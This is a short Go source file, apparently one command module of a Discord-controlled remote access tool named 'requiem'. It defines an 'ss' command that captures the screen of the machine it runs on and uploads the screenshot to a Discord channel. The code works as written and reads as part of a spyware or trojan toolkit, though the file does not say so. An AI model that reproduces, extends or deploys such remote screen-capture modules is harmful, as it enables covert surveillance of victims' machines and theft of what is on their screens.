package commands

import (
	"fmt"

	"requiem/funcs"
	"requiem/store"

	"github.com/bwmarrin/discordgo"
)

func (*ScreenshotCommand) Exec(ctx *store.CommandContext, args []string) {
	pic, err := funcs.CaptureScreen()
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to capture - %s", err))
		return
	}

	ctx.SendComplexMsg(&discordgo.MessageSend{
		Reference: ctx.Message.Reference(),
		Files: []*discordgo.File{{
			Name:   "ss.jpg",
			Reader: pic,
		}},
	})
}

func (*ScreenshotCommand) Name() string {
	return "ss"
}

func (*ScreenshotCommand) Info() string {
	return "Takes a screenshot."
}

type ScreenshotCommand struct{}
